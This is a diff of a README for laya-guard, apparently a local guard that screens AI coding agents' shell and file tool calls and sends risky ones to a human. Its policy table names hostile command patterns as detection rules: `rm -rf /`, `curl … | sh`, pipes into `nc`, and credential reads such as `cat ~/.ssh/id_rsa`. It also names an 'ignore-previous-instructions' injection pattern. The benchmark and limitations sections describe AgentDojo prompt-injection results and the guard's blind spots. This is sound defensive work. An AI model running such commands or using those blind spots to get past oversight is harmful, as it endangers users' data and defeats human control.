-| Cursor | `laya-guard install cursor` | [`beforeShellExecution` hook](integrations/cursor/) | `ask` (human approval) |
-| Gemini CLI | `laya-guard install gemini-cli` | [`BeforeTool` hook](integrations/gemini/check.py) | exit 0 + stderr note |
-| Qwen Code | `laya-guard install qwen-code` | [`PreToolUse` hook](integrations/qwen/check.py) | `ask` (deny when headless) |
-| Windsurf | `laya-guard install windsurf` | [`pre_run_command` hook](integrations/windsurf/guard.py) | exit 0 + stderr note |
-| Copilot CLI | `laya-guard install copilot-cli` | [`preToolUse` hook](integrations/copilot/policy.py) | `ask` (deny when headless) |
-| Cline | `laya-guard install cline` | [`PreToolUse` executable](integrations/cline/PreToolUse) | passes (`cancel: false`) |
-| OpenCode | `laya-guard install opencode` | [`tool.execute.before` plugin](integrations/opencode/laya-guard.ts) | allow + stderr warning |
-| Kilo Code | `laya-guard install kilo` | [`tool.execute.before` plugin](integrations/kilo/laya-guard.ts) | allow + stderr warning |
-| Amp | `laya-guard install amp` | [`tool.call` plugin](integrations/amp/laya-guard.ts) | allow + stderr note |
-
-No hook mechanism, so no adapter: Aider, Roo Code (shut down May 2026),
-Continue (tiers only, repo archived), Junie (allow/ask only). Details in
-[integrations/](integrations/).
-
-`laya-guard install <agent>` does the setup for you ([what it writes and what's left to do](#1c-every-other-agent));
-the manual steps per agent are in [integrations/](integrations/). Claude Code, Cursor, Qwen Code and Copilot CLI route
-`review` to a human (and deny it when nobody can answer); elsewhere `review` warns and passes, so use native
-`permission`/`allowlist` rules alongside if you want hard asks.
-
-Which agents the [file activity log](#see-which-files-your-agents-touched-opt-in) records: shell commands from all of the
-above, and Claude Code's file tools. The others' file tools reach it agent by agent, as their hooks are extended past
-shell commands.
-
-## Use cases
-
-Ready-made adapters for 11 agents live in [integrations/](integrations/) —
-see Supported agents above for the full list.
-
-### 1. Guard Claude Code (PreToolUse hook)
-
-```bash
-laya-guard install claude-code             # ~/.claude/settings.json; shows a diff and asks first
-laya-guard install claude-code --scope local   # ./.claude/settings.local.json (also: project)
-laya-guard status --check                  # where it's installed, is the server up, does the hook work
-laya-guard uninstall claude-code           # removes only what `install` added
-```
-
-`install` registers the hook for the `Bash` tool (`--matcher` to change that, `--files` to add the file tools:
-[below](#protect-files-from-the-agents-file-tools-opt-in)), writes absolute
-paths (hooks often don't inherit your virtualenv's `PATH`), prints a diff, backs up the file
-and asks before writing (`--dry-run` to only look, `--yes` to skip the question). It merges into
-your existing hooks, never overwrites them, and leaves a hand-written `guard-hook.sh` entry alone
-unless you pass `--force`. Afterwards it sends two test calls through the hook (a harmless one and a
-download piped into a shell) and checks the exit codes. The hook is a bash script, so Windows isn't
-supported yet. To do it by hand instead:
-
-Register [guard-hook.sh](guard-hook.sh) as a PreToolUse hook. It reads the tool
-payload from stdin, POSTs it to the local server, and exits 2 on `block`
-(cancelling that run). `review` asks you: the hook prints a `permissionDecision: "ask"`
-JSON and Claude Code shows a permission prompt with the policy and reason
-(`LAYA_GUARD_REVIEW=pass` restores the old pass-through). `allow` passes silently.
-Non-interactive runs (`claude -p`) have nobody to answer, so an `ask` is denied there.
-For the Bash tool only the command is judged, not the agent's description.
-If the server is unreachable or slower than 10s, it falls back to the offline
-check (see [Server down](#server-down)). Point it elsewhere with `LAYA_GUARD_URL`.
-
-#### Protect files from the agent's file tools (opt-in)
-
-The Claude Code hook guards `Bash` by default, so Claude Code's own `Read`, `Edit` and `Write` never reach it: nothing
-stops them from opening `~/.ssh/id_rsa`. `--files` adds them:
-
-```bash
-laya-guard install claude-code --files     # Bash + Read, Edit, MultiEdit, Write, NotebookEdit, Glob, Grep
-```
-
-A file tool call is then judged by the paths it names, against **protected paths**: no model runs, and the content
-being read or written is neither judged nor sent. Out of the box, credential stores (`~/.ssh`, `~/.aws`, `~/.gnupg`,
-`~/.kube`, …), `.env*` files and private keys are *reviewed* (Claude Code asks you) when read, credential stores are
-*blocked* when changed, and a write to the agent's own user-level settings and hooks, to a shell startup file
-(`~/.bashrc`, `~/.zshrc`, …) or to `.git/hooks/**` is reviewed ([`protect.yaml`](src/laya_guard/protect.yaml)). A call that
-names more than 50 paths, or a path over 4096 characters, is reviewed too, never skipped. Add your own in `~/.config/laya-guard/protect.yaml`; edits apply to the
-next call:
-
-```yaml
-version: 1
-protect:
-  - path: "~/work/app/prisma/migrations/**"   # absolute: this project only
-    ops: [write]                               # read, write, or both (the default)
-    action: block                              # review (ask) or block
-    reason: schema history                     # shown with the verdict; keep file names out of it
-  - path: "**/secrets.yaml"                    # **/ matches at any depth
-    except: ["**/secrets.example.yaml"]
-```
-
-Relative globs follow the directory the agent runs in, so they apply in every project; write an absolute path to limit a
-rule to one. The path is checked as named and through symlinks and `..`, ignoring case. It is never written to the
-verdict log (the log keeps the tool name, a hash and a length). Try one without an agent:
-`laya-guard check --offline --tool-name Read --path ~/.ssh/id_rsa x`. With the server down, the offline check applies the
-same rules, and a file call that matches none is allowed instead of asked about.
-
-This sees the **path a tool call names, nothing more**: a file read inside a shell command, a script or a child process
-never reaches it. The shell is still judged as before, with its own sensitive-path checks.
-
-#### See which files your agents touched (opt-in)
-
-laya-guard can keep a record of the files an agent's tool calls name, so you can see what your agents actually reached
-for. It is off by default, because it writes **file paths** (never contents) to disk:
-
-```bash
-laya-guard activity on        # start recording
-laya-guard activity           # the state and the latest events
-laya-guard activity off       # stop; what was recorded stays
-```
-
-Each line of `~/.local/share/laya-guard/file-activity.jsonl` (readable by you only; `LAYA_GUARD_FILE_ACTIVITY_PATH`
-moves it) is one file one call named: `{ts, agent, tool_name, op, path, abs, cwd, source, action, policy_id}` (`cwd`: the directory
-the call ran in; OS-monitor lines add `would`).
-
-- `op` is `read`, `write` or `delete`.
-- `source` says how far to trust a path. `hook`: a file tool (`Read`, `Edit`, `Write`, …) named it. `shell`: guessed
-  from a Bash command, simple forms only (`cat`, `rm`, `cp`, `mv`, `tee`, redirects, …). Anything the shell would still
-  have to expand (`$VAR`, globs, `$(…)`) is skipped, so this misses things.
-- `action` is what the guard answered, so a blocked attempt isn't mistaken for an access.
-
-It lives next to `verdicts.jsonl`, not in it: that file still never holds a path. Set `LAYA_GUARD_FILE_ACTIVITY=1` or
-`0` to decide from the environment instead (it wins over `activity on|off`). Recording stops at 50 MB. Bash calls are
-recorded as soon as it is on, for **every supported agent** (each adapter sends its agent's name and the bare command);
-file tool calls need `install --files` and are Claude Code only so far, because the other agents' hooks are registered
-for shell commands only. It records declared access only. An adapter that knows what a non-shell tool touches can
-report it as `accesses` (`POST /guard`, or `laya-guard check --access read PATH`), which is judged against the protected
-paths and recorded like a file tool.
-
-#### See what the OS saw, not just what the agent said (macOS, optional)
-
-The hooks only know what a tool call says it will touch. A script the agent runs, a child process or a build tool never
-reaches them. On macOS, `laya-guard watch` asks the operating system instead: it reads Apple's `eslogger` (Endpoint
-Security), keeps the files **the agent's own processes** really opened, created, deleted or renamed, and adds them to the
-same file activity log with `source: "os-monitor"`.
-
-```bash
-laya-guard activity on        # the log it writes to
-laya-guard watch              # starts `sudo eslogger` for you (it asks for your password); Ctrl+C stops it
-# or run the privileged part yourself and pipe it in (only eslogger runs as root, laya-guard runs as you):
-sudo eslogger exec fork exit open unlink rename create | laya-guard watch
-```
-
-It needs `sudo`, and Full Disk Access for the terminal app you run it from (System Settings > Privacy & Security > Full
-Disk Access; quit and reopen the app). Then `laya-guard activity` shows the events next to the hook ones.
-
-- **Which processes.** A program named for an agent (`claude`, `codex`, `cursor-agent`, `gemini`, `qwen`, `copilot`,
-  `cline`, `opencode`, `kilo`, `amp`; `--match NAME[=agent]` adds more) starts a tree, and everything it starts is in it,
-  scripts and child processes included. Agents already running when you start are found from `ps`. Everything else on the
-  machine is dropped as soon as it is read.
-- **What is kept.** Writes, deletes and renames always. Reads when a protected path is named, and (by default) when the
-  file is in one of your own folders outside the project the agent was started in; system directories, hidden
-  directories (`~/.nvm`, `~/.zshrc`, …) and `~/Library` are ambient noise unless a rule names them. `--reads
-  protected|outside|all` changes that (`all` is very large) and `--ignore GLOB` cuts your own noise (a protected path is
-  never ignored). The same program doing the same thing to the same path within five seconds is one event.
-- **The record.** Like the hook events, plus `action: "observed"` (it already happened; nothing was stopped) and `would`:
-  what a [protected-path](#protect-files-from-the-agents-file-tools-opt-in) rule would have answered (`review`, `block` or
-  `null`). `tool_name` is the program that touched the file (`cat`, `python3`, …).
-- **Privacy.** An `exec` message carries the process's whole environment, which holds secrets: it is never read, stored or
-  logged, and neither are command lines or file contents. Paths are written in clear to the same owner-only file.
-
-It reports; it cannot block, so blocking stays with the hooks. Apple documents `eslogger`'s output as "NOT API": the shape
-can change with a macOS release, an unrecognised message is skipped rather than guessed at, and `watch` says so when a
-stream never looks like what it expects. Events can be lost if the machine is overloaded, and macOS reports the file that
-was opened, which may not be the name the agent used to reach it (a symlink), so write rules with real paths. A probe on
-one Mac (macOS 26) saw every read, write, delete and rename a stand-in agent made, including reads inside Python and Node
-child processes, at about 700 messages a second and 8 % of one core for `eslogger`. It has not been run for long sessions
-with real agents yet.
-
-#### See where your agents reached, and what to protect (footprint)
-
-With the file activity log on, `laya-guard footprint` answers "what did my agents touch?" per project and session, and
-"what should I protect that I'm not protecting yet?":
-
-```bash
-laya-guard footprint                     # the last 7 days, per project and session
-laya-guard footprint --since 30d --project ~/work/app --agent claude-code
-laya-guard footprint --suggest           # protect.yaml entries worth a look; nothing is applied
-laya-guard footprint --json              # the same, for scripts
-```
-
-For each project: how many reads, writes and deletes, which agents, sessions, the accesses that hit a protected path, the
-files outside the project and the most touched ones. The dashboard's Overview has the same as a File footprint card
-(only when the log has something; click a project for the detail).
-
-- **A project** is the git repository the call's directory is in (the directory itself when there is none); events from
-  before the log kept `cwd`, and calls whose adapter sent no directory, are under `(unknown)`.
-- **A session** is one agent's run of activity in one project with no gap over 30 minutes. The hooks don't send a session
-  id, so this is a guess from the timestamps.
-- **Stopped is not touched.** A call the guard blocked didn't happen, so it is counted as a stopped attempt. A call sent to
-  review is counted as touched: the log can't tell whether you approved it.
-- **Suggestions** are of two kinds, and never applied. *Sensitive*: an agent touched a well-known place for secrets that the
-  default rules don't cover (cloud CLI credentials, browser profiles, shell history, `*.pem`, `*.tfstate`, ...). *Rare*:
-  a folder in your own home, outside the project, that agents touched only a few times (in a few sessions): cheap to
-  protect, and somewhere you may not expect an agent to be. Something an agent uses all the time is not suggested, since
-  protecting it means constant review prompts. Each comes as a `protect.yaml` entry with `review` as its action; paste
-  what you want into `~/.config/laya-guard/protect.yaml`. **An access alone is not evidence of bad intent**: an agent that
-  read `~/Documents/taxes/2025.pdf` once may have been asked to.
-
-### 1b. Guard Cursor (beforeShellExecution hook)
-
-```bash
-laya-guard install cursor              # ~/.cursor/hooks.json; shows a diff and asks first
-laya-guard install cursor --scope project   # ./.cursor/hooks.json (Cursor has no local scope)
-laya-guard status --agent cursor --check
-laya-guard uninstall cursor
-```
-
-Same safety as above (diff, backup, test calls, `--dry-run`, `--yes`, only its own entries are removed),
-with the differences that matter for Cursor. Cursor runs every hook that matches, so laya-guard's entry
-sits next to whatever other tools registered for `beforeShellExecution`, and Cursor takes the strictest
-answer (`deny` beats `ask` beats `allow`). The hook script answers in Cursor's format: `deny` with a
-message for you and one for the agent, `ask` for `review`, otherwise `allow`, and it always prints valid JSON
-because Cursor blocks a command when a permission hook's output isn't. Cursor's `hooks.json` is often not
-strict JSON (other tools leave trailing commas in it); `install` reads it anyway and says so before it
-rewrites the file without them. A hand-written adapter from [integrations/cursor/](integrations/cursor/) is
-reported and left alone unless you pass `--force`, so you don't end up with two judges. The test calls check
-the answer (`allow` / `deny`), not an exit code. These hooks apply to the Cursor app; whether the Cursor CLI
-runs `beforeShellExecution` hooks isn't something Cursor's docs state, so this isn't tested there.
-
-### 1c. Every other agent
-
-```bash
-laya-guard install gemini-cli     # also: codex, qwen-code, windsurf, copilot-cli, cline, opencode, kilo, amp
-laya-guard status --check         # what's installed on this machine, and whether each hook answers
-```
-
-One command per agent, with the same safety as above: it shows a diff first, backs up what it replaces,
-writes absolute paths, merges next to other tools' entries and removes only its own on `uninstall`.
-What it writes, and the one thing it can't do for you:
-
-| Agent | `laya-guard install` writes | You still do |
-|---|---|---|
-| Claude Code | a hook entry in `~/.claude/settings.json` | restart it if it's open |
-| Codex CLI | an entry in `~/.codex/hooks.json`, or a marked block in `config.toml` if that's where your hooks live | run `/hooks` and trust it (Codex asks before running a new hook) |
-| Cursor | an entry in `~/.cursor/hooks.json` | — |
-| Gemini CLI | an entry in `~/.gemini/settings.json`, and `tools.enableHooks` (older versions ship with hooks off) | restart it |
-| Qwen Code | an entry in `~/.qwen/settings.json` | restart it, or open `/hooks` |
-| Windsurf | an entry in `~/.codeium/windsurf/hooks.json` | reload; hooks don't run in Restricted Mode |
-| Copilot CLI | its own file, `~/.copilot/hooks/laya-guard.json` | start a new session |
-| Cline | an executable `~/Documents/Cline/Hooks/PreToolUse` | switch it on in Cline's Hooks tab |
-| OpenCode | `~/.config/opencode/plugins/laya-guard.ts` | restart it |
-| Kilo Code | `~/.config/kilo/plugin/laya-guard.ts` | restart it |
-| Amp | `~/.config/amp/plugins/laya-guard.ts` | run "plugins: reload" |
-
-`--scope project` writes the project-level equivalent instead (`.codex/`, `.gemini/`, `.github/hooks/`, `.amp/plugins/`, ...).
-Hooks get two test calls through the real adapter after installing; plugins (OpenCode, Kilo, Amp) can only be run
-by the agent itself, so `install` says so instead. The adapters shipped in the package are the ones in
-[integrations/](integrations/) (a test keeps them identical). **None of the agents are launched in the tests.**
-The formats come from each agent's current docs and from files other tools leave on a real machine; for Codex,
-Qwen Code, Windsurf, Cline and Kilo `install` says it hasn't been run against the app, and Cline's hook mechanism in
-particular is documented in a way that's moving to plugins.
-
-### 2. Guard any agent loop (HTTP)
-
-Any framework that can make an HTTP call per step — OpenClaw, OpenCode,
-a LangChain/LlamaIndex loop, your own harness — can gate tool execution:
-
-```python
-import requests
-
-def guard(tool_call: str, source: str = "tool") -> None:
-    v = requests.post("http://localhost:8787/guard",
-                      json={"tool_call": tool_call, "source": source},
-                      timeout=60).json()
-    if v["action"] == "block":
-        raise RuntimeError(f"blocked by {v['policy_id']}: {v['reason']}")
-    if v["action"] == "review":
-        ask_human(tool_call)  # your approval step
-```
-
-Use `source="email"`/`"web"`/`"tool"` for tool-output-derived calls to get
-stricter thresholds — this is what stops indirect injections.
-
-### 3. Audit a batch of commands (CLI)
-
-```bash
-while IFS= read -r cmd; do
-  laya-guard check "$cmd" || echo "BLOCKED: $cmd"
-done < commands.txt
-```
-
-(`check` exits 2 on block, so it composes with `||`/`&&` and `xargs`.)
-
-### 4. Gate automation on the Korean set
-
-CI already does this: `eval/run_eval.py --min-acc 1.0` fails the build if
-judgment accuracy regresses. Same command gates policy edits locally.
-
-## Benchmarks (reproducible, not cherry-picked)
-
-| Suite | Result | Command |
-|---|---|---|
-| AgentDojo v1, attacks (judge-level) | **25/27 blocked** | `eval/run_agentdojo.py` |
-| AgentDojo v1, benign (judge-level) | **92/97 kept** (allow+review) | `eval/run_agentdojo.py` |
-| E2E rollout (qwen2.5:7b agent + guard) | **4/4 scenarios** (1 defended, 2 not attempted, 1 benign OK) | `eval/run_rollout.py` → [results](eval/rollout_results.md) |
-| Shell commands (own set: 35 everyday + 36 dangerous/bypass, 10 of them chains) | **69/71** (real, `source=user` and `tool`; the first 50 scored 32/50 and 29/50 before the safe-command lane) | `eval/run_eval.py --set shell` |
-| Korean 30 (own set) | **30/30** (mock **and** real) | `eval/run_eval.py` |
-
-Both in-house sets were written alongside the rules they test (the Korean set
-with the MOCK heuristics, the shell set with the safe-command lane and shell
-regexes), so treat them as regression gates, not accuracy claims — AgentDojo is
-the external number. Shell misses: `npx tsc --noEmit` is reviewed/blocked, and a
-`cargo build --config` runner injection is allowed by the model.
-
-The 2 missed attacks are calendar-event injections indistinguishable from benign
-requests by text alone (source tagging is the intended fix). The 5 remaining
-overblocked benign cases are mostly English prompts — the model is tuned for
-Korean-heavy input (down from 24 after requiring risk agreement for blocks).
-Details in [eval/](eval/).
-
-## Telemetry (measured dogfooding)
-
-Every judgment is appended to a local JSONL log
-(`~/.local/share/laya-guard/verdicts.jsonl`). **The raw `tool_call` text is never
-stored** — only metadata (action, risk, policy, latency) plus a truncated SHA-256
-for counting unique prompts.
-
-```bash
-laya-guard stats       # verdict distribution, block/review rates, top policies, latency
-laya-guard dashboard   # the same as a local web page (see Dashboard); starts the server if it isn't running
-```
-
-The [dashboard](#dashboard) shows the same numbers, and more, in a browser.
-
-Disable with `LAYA_GUARD_LOG=0`, relocate with `LAYA_GUARD_LOG_PATH=...`.
-Publish the aggregates (never raw prompts) as field evidence next to benchmarks.
-
-## How it compares
-
-Most guardrails scan **prompt text**. laya-guard sits one step later: it judges the
-**tool call the agent is about to execute**, with a human-approval lane in between.
-
-|  | laya-guard (this) | [dockndevai/laya-guard](https://pypi.org/project/laya-guard/) | [Rebuff](https://github.com/protectai/rebuff) | [LLM Guard](https://github.com/protectai/llm-guard) | [Vigil](https://github.com/deadbits/vigil-llm) |
-|---|---|---|---|---|---|
-| Guards | agent tool calls | high-risk commands (MCP) | incoming prompts | prompts + outputs | prompts + responses |
-| Fully local & free | ✅ on-device | ✅ on-device | ❌ needs OpenAI+Pinecone keys | ✅ (HF model) | ⚠️ local or OpenAI |
-| Verdict | allow / **review** / block + risk | allow / confirm / block | binary detected | valid + score | scores / thresholds |
-| Korean evaluation | ✅ 30-case set, 30/30 | ❌ none verified | ❌ | ❌ | ❌ |
-| AgentDojo numbers | ✅ 25/27, 92/97 (judge-level, self-reported) | ❌ none verified | ❌ | ❌ | ❌ |
-| Status | active, v0.4.1, MIT | MIT | ⚠️ archived May 2025 | ⚠️ archived, unmaintained | alpha, Apache-2.0 |
-
-No verified third-party AgentDojo score exists for any tool in this table —
-ours is self-reported and judge-level (see [Limitations](#limitations)).
-
-## Policies (12)
-
-| id | What it catches | Regex hit ⇒ |
-|---|---|---|
-| `destructive-fs` | `rm -rf /` and `rm -rf ~`/`$HOME` in any flag order (`-fr`, `-r -f`, `--recursive --force`), `mkfs`, `dd` to devices, fork bombs | block |
-| `pipe-to-shell` | `curl … \| sh`, `wget … \| sudo bash`, `bash -c "$(curl …)"`, `bash <(curl …)` | block |
-| `exfiltration` | tunnels, pipes into `nc`, `curl -d @file` uploads | review |
-| `prompt-injection` | ignore-previous-instructions, jailbreaks, KR+EN | block |
-| `secrets-leak` | API keys, private keys, tokens, key files (`~/.ssh`, `~/.aws`, …) piped into `curl`/`wget`/`nc` | block |
-| `payment-action` | payments/refunds/charges, KR+EN | review |
-| `remote-exec` | sketchy package indexes, remote scripts, local pipes into a shell, encoded PS | review |
-| `priv-escalation` | `sudo sh`, `chmod 777`, setuid, redirects into `/etc/` | review |
-| `persistence` | cron, services, shell-rc hooks, git `core.hooksPath`/`core.pager` | review |
-| `mass-delete` | `DROP TABLE`, `s3 rm --recursive`, `kubectl delete --all`, `git push --force`, `git reset --hard`, `git clean -f`, `git checkout -- .` | review |
-| `auth-bypass` | auth/TLS disabling, password resets, KR+EN | block |
-| `credential-read` | reading private keys / cloud credentials (`cat ~/.ssh/id_rsa`, `cat ~/.aws/credentials`, …) | review |
-
-All patterns live in [policy.yaml](src/laya_guard/policy.yaml) — edit, add your own, no code changes needed.
-
-## API
-
-- `GET /health` → `{"ok": true, "mock": false}`
-- `POST /guard` `{tool_call, source?, cwd?, tool_name?, paths?, agent?}` → `{action, risk, policy_id, reason, mock, verdict_source}`
-  (`source`: `user` | `tool` | `email` | `web`; non-user sources get stricter thresholds.
-  `cwd`: absolute directory the command runs in; enables package.json script checks.
-  `tool_name`: the agent's name for the tool being called (`Bash`, `Edit`, an MCP tool, …); it is logged (in clear, up
-  to 64 characters; `null` when absent) and counted by `laya-guard stats`. With `paths` (the files the call names) it
-  also marks a file tool call (`Read`, `Edit`, `MultiEdit`, `Write`, `NotebookEdit`, `Glob`, `Grep`): that call is
-  judged by the paths alone, against the protected paths, and `tool_call` is ignored. For any other tool it doesn't
-  change the verdict. `agent`: which agent is calling (`claude-code`); it only labels the opt-in file activity log.
-  `reason` is Korean when the input contains Hangul, English otherwise.
-  `verdict_source`: `regex` (prefilter block, model skipped) |
-  `allowlist` (safe command, model skipped) | `model` |
-  `heuristic` (MOCK mode, or the model errored and regex+heuristics stood in) |
-  `limit` (input over 256K chars or a line over 16K chars, blocked unread).
-  `laya-guard check --offline --json` returns the same shape with `offline`.)
-- `POST /v1/systemone` — drop-in compatible shim for Jev-style `{state, questions}` calls
-- `GET /dashboard` — the local dashboard page; `GET /api/stats?window=1h|24h|7d|30d|all` — the
-  numbers behind it (totals, timeline, per-policy counts, recent verdicts as hash + length).
-  Both answer 403 unless the `Host` header is loopback.
-- `GET /api/agents` — the agents found on this machine and, for Claude Code, where the hook stands. `POST /api/agents/{agent}/{install|uninstall}`
-  with `{"mode": "preview"}` returns the diff and its `diff_id`; `{"mode": "apply", "diff_id": ...}`
-  makes the change. Needs the page's token and a same-origin JSON request (see above).
-## Configuration
-
-| Knob | Where | Default |
-|---|---|---|
-| `LAYA_GUARD_MOCK=1` | env | off — heuristics only, no model (for CI/demo) |
-| `LAYA_GUARD_DEVICE` | env | `cpu` (deterministic; set `mps` for speed at the cost of reproducibility) |
-| `LAYA_GUARD_URL` | env (hooks/adapters) | `http://localhost:8787/guard` |
-| `LAYA_GUARD_FAIL` | env (hooks/adapters) | `ask` — with the server down, an unjudged call goes to a human, or is blocked by agents that can't ask; `closed` blocks it; `open` lets it pass (see [Server down](#server-down)) |
-| `LAYA_GUARD_REVIEW` | env (Claude Code hook) | `ask` — `review` becomes a permission prompt; `pass` lets it through without asking |
-| `LAYA_GUARD_BIN` | env (hooks/adapters) | `laya-guard` — CLI used for the offline check |
-| `--no-warmup` | `laya-guard serve` | off — the model loads before the server listens |
-| `LAYA_GUARD_ALERT_CMD` | env (hooks and server) | unset — a shell command run (once per outage, in the background) when calls are judged without the model; see [Keep it running](#keep-it-running-and-hear-about-outages) |
-| `LAYA_GUARD_ALERT_COOLDOWN` | env | `600` — seconds before the same kind of alert can run again |
-| block/review thresholds | `policy.yaml` → `defaults` | 0.8 / 0.45 |
-| model checkpoint | `policy.yaml` → `defaults.model` | `multilingual` |
-
-## Server down
-
-Every adapter waits 10s for the server. If it's down, errors, or is slower than
-that, the adapter runs `laya-guard check --offline` (regex + safe-command lane,
-no model) instead:
-
-| Call | Offline verdict |
-|---|---|
-| matches any regex policy (block or review level) | block |
-| package.json script of a safe command matches a regex policy | block |
-| safe command, or a chain of only safe commands | allow |
-| anything else (it can't be judged without the model) | `review` (asked, or blocked where the agent can't ask; see below); `LAYA_GUARD_FAIL=closed` blocks it; `LAYA_GUARD_FAIL=open` allows it with a stderr warning |
-
-Hook input the adapter can't read, and a call made when the CLI isn't on the agent's `PATH` either, get the same
-answer as that last row (set `LAYA_GUARD_BIN` to the CLI's full path, e.g. `~/.venv/bin/laya-guard`).
-
-The default, **`ask`**, sends what the guard couldn't judge to a person. Claude Code, Cursor, Qwen Code, Copilot CLI
-and Amp's legacy permissions helper put the question to you, and when nobody can answer (a headless run) the ask is
-denied. The agents with no ask lane (Gemini CLI, Codex, Windsurf, Cline, OpenCode, Kilo, the Amp plugin) have nobody to
-ask, so they block the call and say that `LAYA_GUARD_FAIL=open` would let it through. `LAYA_GUARD_REVIEW=pass` means
-nobody is asked either, so with it an offline `review` is blocked. **`closed`** blocks every unjudged call, for
-unattended runs (CI, scheduled agents). **`open`** lets them pass with a warning, for when an outage must not stop the
-work and you accept that those calls run unchecked. (`open` was the default up to 0.3.0.)
-
-An outage is not a verdict, so it is recorded as one of its own: every offline check is appended to the verdict log
-with `via: "offline"` (hash and length only, like every entry), the server records how it judged
-(`via: "model"`, `"regex"`, `"allowlist"`, `"heuristic"` after a model error, `"limit"`), and `laya-guard stats`
-prints how many calls were judged without the model, with the server down or after a model error. Mock mode doesn't
-count: that is a choice, not an outage.
-
-### Keep it running, and hear about outages
-
-A guard whose server you have to remember to start has a single point of failure, so laya-guard can start it for you,
-**if you ask**: `laya-guard service install` writes a macOS LaunchAgent (`~/Library/LaunchAgents/com.laya-guard.server.plist`)
-or a Linux systemd user unit (`~/.config/systemd/user/laya-guard.service`), shows the file first, and starts the server
-now and at every login (restarting it after a crash, at most every 30 seconds). The model is loaded up front, about
-1.4 GB and 5 seconds per start; `--no-warmup` loads it on the first call instead (about 90 MB while idle). A server
-you started by hand keeps the port; the service takes over once it stops. `laya-guard service status` shows where it
-stands and `laya-guard service uninstall` removes it. The dashboard's Overview has the same switch ("Start at login").
-Hooks don't depend on any of this: without the server they use the offline check, as before. Windows isn't
-supported yet. The environment the server reads (`LAYA_GUARD_ALERT_CMD`, `LAYA_GUARD_LOG_PATH`, ...) is copied into the
-file when you install, and the file is readable only by you.
-
-The dashboard turns **Degraded** (amber, with a note and a "Judged without the model" card) when calls in the last hour
-were judged without the model, and each call says who judged it. To be told when it happens, set
-`LAYA_GUARD_ALERT_CMD` to any shell command: it is started in the background, at most once per
-`LAYA_GUARD_ALERT_COOLDOWN` seconds for each kind of outage (`server-down`, from the hook's offline fallback, the one
-piece of code still running when the server is down; `model-error`, from the server). The text is in
-`LAYA_GUARD_ALERT_KIND` and `LAYA_GUARD_ALERT_MESSAGE`, never in the command line, and a hook never waits for the
-command or fails because of it. For example, on macOS:
-
-```bash
-export LAYA_GUARD_ALERT_CMD='osascript -e "display notification \"$LAYA_GUARD_ALERT_MESSAGE\" with title \"laya-guard\""'
-```
-
-Inputs over 256K characters, or with a line over 16K, are blocked without being
-read: some regexes are quadratic in line length, and a 200KB line used to take
-48s, long enough for hooks to time out.
-
-The model reads at most 4,000 characters per call. Longer input is split into
-windows on line boundaries (a single long line is cut with a small overlap), every
-window is judged, and the worst verdict wins, so a dangerous command after a long
-harmless preamble is still seen. Past 6 windows (~24K characters) the middle is
-skipped (the first windows and the last one are kept) and an `allow` is raised to
-`review`; regexes always run over the whole text. Each extra window costs about
-the same as one model call, so a 6-window input takes a few seconds.
-
-## Limitations (read before trusting it)
-
-- With the server down, calls that are neither regex-flagged nor safe commands
-  are **not judged by the model**: you're asked about them, or they're blocked by
-  agents that can't ask ([Server down](#server-down)). `LAYA_GUARD_FAIL=open`
-  lets them pass unchecked instead.
-- If the model fails at runtime, verdicts fall back to regex+heuristics. They are
-  marked `verdict_source: "heuristic"` and a warning is logged — check it if you
-  rely on model judgments.
-- The safe-command lane allows `npm test`, `make test`, `go test`, etc. without the
-  model. package.json scripts are regex-checked (see above), so `curl … | sh` or a
-  secret upload in `scripts.test` is caught, but a quieter script (`node -e …`,
-  `node scripts/x.js`) passes. Code those commands run is not checked at all:
-  test files, `conftest.py`, `build.rs`, `node_modules/.bin`, Makefile recipes
-  (expanding them with `make -n` would run `$(shell …)`), and `.npmrc`
-  `script-shell`. An edit to them is judged only when the agent writes it, and only
-  by adapters that hook file edits. Trim `safe_commands` in `policy.yaml` if that
-  matters to you. (Claude Code's file tools, once guarded with `--files`, are judged by their paths alone, not by what
-  they write.)
-- Script checks trust the `cwd` the agent reports. If an agent's shell keeps a
-  `cd` from an earlier call but reports the project root, the wrong package.json
-  is read. Five adapters (Cline, Gemini, Qwen, Kilo, Amp) send the tool call as
-  JSON, so it never qualifies as a safe command and goes to the model instead.
-- Protected paths see declared access only: the path a file tool call names. A file read by a shell command, a script
-  or a child process is invisible to them (the optional macOS [OS monitor](#see-what-the-os-saw-not-just-what-the-agent-said-macos-optional)
-  sees those, but only reports), and a rule can't tell an honest `Read` of `.env` from a harmful one: a match is
-  reviewed or blocked, not understood.
-- Chain commands are judged one by one, so the model doesn't see that `cd /etc`
-  came before `cat shadow`. Sensitive-path checks and whole-string regexes cover
-  the common cases, not all of them.
-- Regex `block` hits return a hardcoded `risk: 0.92` — the model is skipped, so the
-  score is a flag, not a calibrated probability.
-- Per-policy Laya hints (`choice_hint`/`score_hint` in `policy.yaml`) are declared
-  but deliberately **not** wired: appending them to question instructions dropped
-  AgentDojo attack recall 25/27 → 14/27 (overblocks fell only as a side effect of
-  blanket leniency, so it was reverted). One generic question set is used until a
-  mechanism that survives eval is found.
-- AgentDojo numbers are **judge-level only** (attack text judged directly, default
-  `source=user`), not end-to-end agent rollouts. See `eval/run_rollout.py` for the
-  rollout harness (requires Ollama + `qwen2.5:7b`).
-
-## Contributing
-
-PRs welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for setup, the CI gates, and
-guidelines; open work is tracked in [GitHub Issues](https://github.com/scs0209/laya-guard/issues).
-The most useful report is a command that was judged wrong: use the Missed attack
-or Overblock issue form. Changes are logged in [CHANGELOG.md](CHANGELOG.md).
-Found a vulnerability in laya-guard itself? See [SECURITY.md](SECURITY.md) —
-please don't file it publicly. This project follows the
-[Contributor Covenant](CODE_OF_CONDUCT.md).
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+[MIT](LICENSE). The Laya model is Apache-2.0, and the dashboard bundles [three.js](https://threejs.org) (MIT,
+`src/laya_guard/static/vendor/THREE_LICENSE.txt`).
